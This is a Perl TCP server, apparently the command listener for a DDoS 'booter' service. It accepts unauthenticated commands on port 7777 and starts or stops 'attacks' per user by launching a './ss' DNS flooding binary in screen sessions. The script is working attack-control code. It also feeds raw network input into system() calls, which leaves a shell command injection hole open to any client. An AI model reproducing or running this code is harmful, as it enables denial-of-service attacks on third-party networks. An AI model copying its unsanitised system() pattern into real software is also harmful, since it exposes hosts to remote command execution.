use IO::Socket::INET;
#Server for API system
#NOT THE CLIENT

my $port = "7777";
$| = 1;
my $socket = new IO::Socket::INET (
    LocalHost => '0.0.0.0',
    LocalPort => $port,
    Proto => 'tcp',
    Listen => 5,
    Reuse => 1
);
die "Failed to bind port $port\n" unless $socket;
print "Waiting For Commands from tower on port $port\n";
 
while(1)
{
    my $client_socket = $socket->accept(); 
    my $client_address = $client_socket->peerhost();
    my $data = ""; $client_socket->recv($data, 1024);
	 
	  my ( $username, $method, $sec1, $sec2, $sec3, $sec4, $sec5, $other ) = split( / /, $data, 8 );

	
	
	#Methods, With a stop button for easy modifcation
	if ($method =~ /^stop\s*$/ ) {
		print "Stopping attack from user: $username\n";
		system("screen -S $username -X quit");
	}
	if ( $method =~ /^dns\s*$/ ) {
		print "$username | $method $sec1 $sec2 $sec3 $sec4 $sec5 $other\n";
		system("screen -dmS $username ./ss $sec1 $sec2 lest 10 $sec3 $other");
	}
	

}
 
$socket->close();
